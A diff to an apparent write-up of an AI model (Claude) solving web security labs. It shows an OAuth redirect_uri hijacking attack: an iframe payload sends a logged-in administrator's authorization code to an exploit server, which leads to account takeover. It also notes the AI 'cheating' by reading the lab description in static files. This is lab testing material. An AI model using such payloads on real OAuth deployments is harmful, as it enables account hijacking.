@@ -145,9 +145,7 @@ After changing the `price` field to `$0.01`, Claude was able to purchase the jac
 3. Claude identified that the site used OAuth with `redirect_uri=https://[lab]/oauth-callback` and `response_type=code`.
 4. It *"cheats"* a little bit by analyzing static files... Claude happily stated, *"Now I can see the lab description link reveals the vulnerability type: OAuth account hijacking via redirect_uri! This is a classic OAuth vulnerability where the redirect_uri parameter can be manipulated to redirect the authorization code to an attacker-controlled server. Let me proceed with the exploit"*.
 5. A malicious link is crafted that starts the OAuth flow with `redirect_uri` pointing to the exploit server (`redirect_uri=https://exploit-0aa200ac03b9b2be8217b95c011b00a2.exploit-server.net/exploit`).
-6. The link is embedded onto the exploit server in an `iframe`.
-```
-<iframe src="https://oauth-0a44007b0372b2e08235b8b7020400fb.oauth-server.net/auth?client_id=xaizbjl3rhhcsh2bnut2y&redirect_uri=https://exploit-0aa200ac03b9b2be8217b95c011b00a2.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
+6. The link is embedded onto the exploit server in an `iframe` (`<iframe src="https://oauth-0a44007b0372b2e08235b8b7020400fb.oauth-server.net/auth?client_id=xaizbjl3rhhcsh2bnut2y&redirect_uri=https://exploit-0aa200ac03b9b2be8217b95c011b00a2.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>`).
 ```
 7. When the administrator *(who is already logged into the OAuth server)* loads this `iframe`, their browser will automatically authorize and the auth code will be sent to the exploit server.
 8. The administrator views the `iframe` after a link is sent to them, and the hijacked authorization code is used to replay their session in the browser. The administrator account is now in the attacker's control.
